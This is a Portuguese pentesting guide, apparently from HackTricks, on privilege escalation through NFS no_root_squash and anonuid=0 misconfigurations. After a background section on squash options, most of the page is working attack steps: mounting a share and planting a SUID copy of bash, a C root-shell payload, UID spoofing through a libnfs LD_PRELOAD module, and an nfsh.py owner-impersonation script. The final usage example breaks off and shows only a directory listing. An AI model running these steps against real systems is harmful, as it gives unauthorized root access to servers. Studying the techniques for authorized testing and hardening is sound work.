# Escalação de privilégios por configuração incorreta de NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas sobre squashing

Com NFS AUTH_SYS/AUTH_UNIX, o servidor baseia as verificações de permissões de arquivo no `uid` e `gid` fornecidos em cada solicitação RPC. Outros flavors de segurança, como Kerberos, usam credenciais diferentes, e o servidor pode mapear credenciais numéricas antes de verificar as permissões.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapeia todos os UID e GID para a conta anônima, que por padrão é `nobody` (65534) no Linux. `no_all_squash` é o padrão para solicitações que não sejam de root.<sup>[[4]](#references)</sup>
- **`root_squash`**: É o padrão no Linux e mapeia solicitações com UID/GID 0 (root) para a conta anônima; os outros UID e GID não são squashed.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Desativa o root squashing, portanto, as solicitações com UID/GID 0 podem ser avaliadas como root no servidor.<sup>[[4]](#references)</sup>

Se um cliente permitido puder montar um export gravável em **`/etc/exports`** configurado com **`no_root_squash`**, suas solicitações com UID/GID 0 poderão gravar nele como o usuário root do servidor.<sup>[[4]](#references)</sup>

`root_squash` remapeia apenas UID/GID 0; com AUTH_SYS, o **UID/GID numérico diferente de zero** de um cliente permitido ainda pode corresponder a outra conta no servidor. Portanto, mesmo com root squashing, um export gravável pode se tornar um caminho entre usuários se o cliente puder criar um arquivo com essa identidade numérica e o servidor permitir o acesso. Para uma transferência SUID/SGID, verifique também o proprietário do arquivo resultante, o acesso de execução, o estado `nosuid` da montagem do servidor, as ACLs e o SELinux ou outra política. O caminho exportado, a opção `rw` ou a correspondência numérica, por si só, não comprovam que o cliente tem permissão, que o export está ativo ou que os dois hosts compartilham o mesmo mapeamento efetivo de identidades. Inspecione `/etc/exports` e os metadados locais passivamente; não monte um novo compartilhamento nem crie um arquivo de teste durante a enumeração.<sup>[[4]](#references)[[5]](#references)</sup>

Para mais informações sobre **NFS**, consulte:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalação de privilégios

### Mapeamento anônimo equivalente a root

Não verifique apenas se há `no_root_squash`. Com `root_squash,anonuid=0,anongid=0`, uma solicitação de um cliente com UID/GID 0 é squashed **de volta para root**. Com `all_squash,anonuid=0,anongid=0`, até mesmo as identidades não root do cliente são mapeadas para root no servidor. Em um export `sec=sys` gravável, qualquer uma dessas configurações pode fornecer a primitiva de arquivo de propriedade de root usada na transferência SUID abaixo; as restrições de cliente permitido e de montagem na vítima ainda se aplicam.<sup>[[4]](#references)</sup>

No servidor, use `exportfs -v` para inspecionar o export ativo e as opções do **cliente correspondente**, incluindo `rw`, `sec=`, o modo de squash e `anonuid`/`anongid`. Ao revisar a configuração, inspecione também `/etc/exports.d/*.exports`; `/etc/exports` sozinho pode estar incompleto.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Opção 1 usando bash:
- Em um cliente autorizado, monte um export gravável como root, copie **`/bin/bash`** para ele, defina o bit **SUID** e execute-o a partir de um mount da vítima que não use `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Para que o arquivo enviado continue pertencendo a root, o servidor deve preservar o UID 0 do cliente com **`no_root_squash`** ou mapear a solicitação para o UID 0 com **`anonuid=0`**. Caso contrário, só será possível usar um binário SUID para outra conta se o cliente puder criá-lo ou ser proprietário dele usando o UID/GID numérico dessa conta.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Opção 2 usando código C compilado:
- Monte o diretório a partir de um cliente permitido, copie nele um payload compilado que abuse das permissões SUID, defina o bit **SUID** e execute-o na vítima (veja alguns [payloads SUID em C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Mesmas restrições de antes

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Exploração Local

> [!TIP]
> Observe que, se você puder criar um **túnel da sua máquina para a máquina vítima, ainda poderá usar a versão remota para explorar essa escalada de privilégios tunelando as portas necessárias**.\
> O truque a seguir é útil quando `/etc/exports` restringe a exportação ao IP da vítima: o cliente remoto não consegue montá-la, mas a técnica local pode operar por meio do compartilhamento já montado no host permitido.<sup>[[2]](#references)</sup>\
> Para este método não privilegiado com libnfs, a exportação em **`/etc/exports`** deve usar a flag `insecure` para que o processo possa usar uma porta de origem não reservada; `secure` é o padrão, embora um processo capaz de vincular-se a uma porta reservada não precise dessa opção.<sup>[[1]](#references)[[4]](#references)</sup>

### Informações Básicas

Um cliente NFSv3 AUTH_UNIX inclui seu UID efetivo, GID e grupos em cada chamada, e o servidor os usa para verificar permissões. Esta técnica local explora esse modelo falsificando as credenciais RPC por meio de [libnfs](https://github.com/sahlberg/libnfs); seu módulo preload permite substituir o UID/GID no contexto NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilando a Biblioteca

O exemplo de libnfs pode exigir ajustes para o kernel alvo; o passo a passo usado aqui observa especificamente que é necessário comentar as chamadas de sistema fallocate antes de compilar o módulo preload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Executando o exploit

O exemplo cria um pequeno helper em C que inicia um shell, depois o coloca no compartilhamento e usa `ld_nfs.so` com UID 0 no contexto do NFS para torná-lo SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compile o código do exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Coloque o exploit no compartilhamento e modifique suas permissões falsificando o UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Execute o exploit para obter privilégios de root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bônus: NFShell para acesso discreto a arquivos

Depois de obter acesso root, este padrão `nfsh.py` define o UID efetivo como o UID do arquivo de destino antes de executar um comando, permitindo o acesso sem alterar recursivamente a propriedade dos arquivos.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Execute assim:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [A história de um privesc de NFS menos conhecido](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Especificação do protocolo NFS versão 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
